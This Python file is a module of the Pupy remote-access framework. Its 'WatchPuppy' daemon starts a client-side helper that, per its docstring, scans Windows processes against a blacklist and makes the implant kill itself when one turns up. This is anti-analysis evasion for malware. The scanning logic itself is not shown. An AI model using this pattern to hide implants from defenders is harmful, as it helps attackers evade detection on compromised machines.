# -*- coding: UTF8 -*-
from pupylib.PupyModule import *
import StringIO
import SocketServer
import threading
import socket
import logging
import struct
import traceback
import time
import os
import datetime
from pupylib.utils.rpyc_utils import redirected_stdio

__class_name__="WatchPuppy"

@config(compat="windows", cat="manage")
class WatchPuppy(PupyModule):
    """ 
        The watch puppy searches for processes from a black list and suicides in case of a find
    """
    daemon=True
    unique_instance=True
    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog='watch_puppy', description=self.__doc__)
        self.arg_parser.add_argument('action', choices=['start', 'stop'])

    def stop_daemon(self):
        self.success("watch puppy stopped")
        
    def run(self, args):
        if args.action=="start":
            self.client.load_package("psutil")
            self.client.load_package("pupwinutils.watch_puppy")
            with redirected_stdio(self.client.conn): #to see the output exception in case of error
                if not self.client.conn.modules["pupwinutils.watch_puppy"].watch_puppy_start():
                    self.error("the watch puppy is already started")
                else:
                    self.success("watch puppy started !")

        elif args.action=="stop":
            if self.client.conn.modules["pupwinutils.watch_puppy"].watch_puppy_stop():
                self.success("watch puppy stopped")
            else:
                self.success("watch puppy is not started")



